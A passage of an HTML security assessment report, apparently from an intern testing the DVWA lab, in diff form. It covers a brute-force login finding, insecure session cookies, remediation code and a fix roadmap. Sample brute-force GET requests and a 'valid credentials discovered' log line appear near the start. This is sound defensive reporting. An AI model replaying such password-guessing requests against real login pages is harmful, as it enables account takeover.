+<span class="t-kw">GET</span> <span class="t-url">/vulnerabilities/brute/?username=admin&amp;password=admin&amp;Login=Login</span> HTTP/1.1
+<span class="t-kw">GET</span> <span class="t-url">/vulnerabilities/brute/?username=admin&amp;password=password&amp;Login=Login</span> HTTP/1.1
+<span class="t-kw">GET</span> <span class="t-url">/vulnerabilities/brute/?username=admin&amp;password=123456&amp;Login=Login</span> HTTP/1.1
+<span class="t-kw">GET</span> <span class="t-url">/vulnerabilities/brute/?username=admin&amp;password=letmein&amp;Login=Login</span> HTTP/1.1
+
+<span class="t-danger">[!] SUCCESS — Valid credentials discovered: admin:password</span>
+<span class="t-danger">[!] No account lockout triggered after 250+ failed attempts</span></pre>
+          </div>
+
+          <div class="subsection-title">🟢 Remediation Recommendations</div>
+          <div class="code-wrap">
+            <div class="code-label label-fix">Remediation Code</div>
+            <pre class="code-block secure-code"><span class="t-cmt">// ✅ SECURE: Implement exponential backoff after failed login attempts</span>
+<span class="t-kw">if</span> (<span class="t-key">$failed_attempts</span> >= <span class="t-str">5</span>) {
+    <span class="t-fn">http_response_code</span>(<span class="t-str">429</span>); <span class="t-cmt">// Too Many Requests</span>
+    <span class="t-fn">sleep</span>(<span class="t-str">pow</span>(<span class="t-str">2</span>, <span class="t-key">$failed_attempts</span> - <span class="t-str">5</span>)); <span class="t-cmt">// Exponential delay</span>
+    <span class="t-fn">log_security_event</span>(<span class="t-str">'brute_force_detected'</span>, <span class="t-key">$ip_address</span>);
+    <span class="t-kw">exit</span>(<span class="t-str">'Account temporarily locked. Try again later.'</span>);
+}
+
+<span class="t-cmt">// ✅ Additionally: Enforce HTTPS-only, implement TOTP-based MFA, use strong password hashing (bcrypt)</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- ───── FINDING 04 ───── -->
+      <div class="finding">
+        <div class="finding-header">
+          <div class="finding-title">
+            <span class="finding-icon">🍪</span>
+            VULN-04 — Insecure Session Cookie Configuration
+          </div>
+          <span class="badge badge-medium">Medium CVSS 6.5</span>
+        </div>
+        <div class="finding-body">
+          <div class="meta-row">
+            <div class="meta-cell">
+              <div class="mc-label">Affected Cookie</div>
+              <div class="mc-value"><code>PHPSESSID</code></div>
+            </div>
+            <div class="meta-cell">
+              <div class="mc-label">Inspection Method</div>
+              <div class="mc-value">Browser DevTools → Application → Cookies</div>
+            </div>
+            <div class="meta-cell">
+              <div class="mc-label">OWASP Reference</div>
+              <div class="mc-value">A07:2021 — Auth Failures</div>
+            </div>
+          </div>
+
+          <p class="finding-desc">
+            An inspection of session management via Browser Developer Tools confirmed that the application's primary session identifier <strong><code>PHPSESSID</code></strong> is issued without the <code>HttpOnly</code>, <code>Secure</code>, or <code>SameSite</code> attributes. This directly amplifies the impact of the XSS vulnerability identified as VULN-02, as attacker-injected scripts can trivially exfiltrate session tokens.
+          </p>
+
+          <div class="subsection-title">🔍 Cookie Attribute Audit Results</div>
+          <table class="cookie-table">
+            <thead>
+              <tr><th>Cookie Name</th><th>Value</th><th>HttpOnly</th><th>Secure</th><th>SameSite</th><th>Risk Status</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>PHPSESSID</strong></td>
+                <td>9a8b7c6d5e4f3a2b</td>
+                <td><span class="flag-miss">✗ Missing</span></td>
+                <td><span class="flag-miss">✗ Missing</span></td>
+                <td><span class="flag-miss">✗ None</span></td>
+                <td><span class="badge badge-critical">Vulnerable</span></td>
+              </tr>
+              <tr>
+                <td><strong>security</strong></td>
+                <td>low</td>
+                <td><span class="flag-miss">✗ Missing</span></td>
+                <td><span class="flag-miss">✗ Missing</span></td>
+                <td><span class="flag-miss">✗ None</span></td>
+                <td><span class="badge badge-high">Exposed</span></td>
+              </tr>
+            </tbody>
+          </table>
+
+          <div class="subsection-title">🟢 Secure Cookie Configuration Fix</div>
+          <div class="code-wrap">
+            <div class="code-label label-fix">Remediation Code</div>
+            <pre class="code-block secure-code"><span class="t-cmt"># ✅ php.ini — Secure Session Cookie Configuration</span>
+<span class="t-safe">session.cookie_httponly</span> = <span class="t-str">1</span>    <span class="t-cmt">; Prevents JS access to cookie (blocks XSS theft)</span>
+<span class="t-safe">session.cookie_secure</span>   = <span class="t-str">1</span>    <span class="t-cmt">; Cookie only sent over HTTPS connections</span>
+<span class="t-safe">session.cookie_samesite</span> = <span class="t-str">"Lax"</span> <span class="t-cmt">; Protects against Cross-Site Request Forgery (CSRF)</span>
+<span class="t-safe">session.use_strict_mode</span> = <span class="t-str">1</span>    <span class="t-cmt">; Reject uninitialized session IDs</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── 5. DEFENSIVE ROADMAP ── -->
+      <div class="section-heading">
+        <div class="sh-num">5</div>
+        <div class="sh-text">Defensive Remediation Roadmap</div>
+        <div class="sh-line"></div>
+      </div>
+
+      <div class="roadmap">
+        <div class="rm-item">
+          <div class="rm-badge p1">P1<br/>0–7 Days</div>
+          <div>
+            <div class="rm-content-title">🔴 Immediate — Eliminate SQL Injection Risk</div>
+            <div class="rm-content-desc">Refactor all SQL database queries across the application to use PDO Prepared Statements. Conduct a full code-level audit to identify any additional un-parameterized database calls. Activate a Web Application Firewall (WAF) rule to block known SQLi patterns as an interim control.</div>
+          </div>
+        </div>
+        <div class="rm-item">
+          <div class="rm-badge p2">P2<br/>7–30 Days</div>
+          <div>
+            <div class="rm-content-title">🟠 High Priority — XSS &amp; Authentication Hardening</div>
+            <div class="rm-content-desc">Implement context-aware HTML output encoding across all user-facing output rendering. Deploy a strict Content Security Policy (CSP) response header. Enforce account lockout after 5 consecutive failed login attempts, add CAPTCHA for suspicious IPs, and enforce TLS on all authentication endpoints.</div>
+          </div>
+        </div>
+        <div class="rm-item">
+          <div class="rm-badge p3">P3<br/>30–60 Days</div>
+          <div>
+            <div class="rm-content-title">🟡 Medium Priority — Session &amp; Transport Hardening</div>
+            <div class="rm-content-desc">Configure <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite=Lax</code> attributes on all session cookies. Enforce HTTPS-only access across the entire application. Implement Multi-Factor Authentication (MFA/TOTP). Establish a quarterly recurring vulnerability scanning program using OWASP ZAP.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── 6. CONCLUSION ── -->
+      <div class="section-heading">
+        <div class="sh-num">6</div>
+        <div class="sh-text">Conclusion &amp; Overall Security Posture</div>
+        <div class="sh-line"></div>
+      </div>
+
+      <div class="conclusion-box">
+        <p>This web application security assessment identified <strong>4 distinct, exploitable vulnerabilities spanning 3 severity tiers</strong> within the target application's input validation, authentication, and session management mechanisms. The most critical finding — an In-Band SQL Injection vulnerability rated CVSS 9.8 — represents an immediate and severe threat to confidentiality, integrity, and data availability.</p>
+        <p>The positive finding is that all identified vulnerabilities have well-established, industry-proven remediation controls. Systematic implementation of the <strong>Defensive Remediation Roadmap</strong> outlined in Section 5 — prioritizing input parameterization, output encoding, and authentication hardening — would dramatically reduce the application's attack surface and align its security posture with modern OWASP Application Security Verification Standard (ASVS) Level 2 requirements.</p>
+        <p>It is strongly recommended that development teams implement the proposed remediations within the defined timelines, followed by a <strong>verification re-assessment</strong> to confirm effective closure of all identified findings.</p>
+      </div>
+
+    </div>
+
+    <!-- ── 12. REFERENCES ── -->
+      <div class='section-heading'>
+        <div class='sh-num'>12</div>
+        <div class='sh-text'>References</div>
+        <div class='sh-line'></div>
+      </div>
+      <div class='exec-box'>
+        <ul>
+          <li>OWASP Top 10 (2021)</li>
+          <li>NIST SP 800-63B Authentication Guidelines</li>
+          <li>MITRE CWE Database</li>
+        </ul>
+      </div>
+
+    </div>
+    <!-- ══════════════════ FOOTER ══════════════════ -->
+    <div class="report-footer">
+      <div class="rf-left">
+        <strong>Web Application Security Assessment Report</strong><br />
+        Prepared by: Web Security Analyst Intern &bull; Report Date: June 17, 2026 &bull; Version: 1.0 Final
+      </div>
+      <div class="rf-conf">Strictly Confidential</div>
+    </div>
+
+  </div><!-- end .report -->
+
+</body>
+</html>
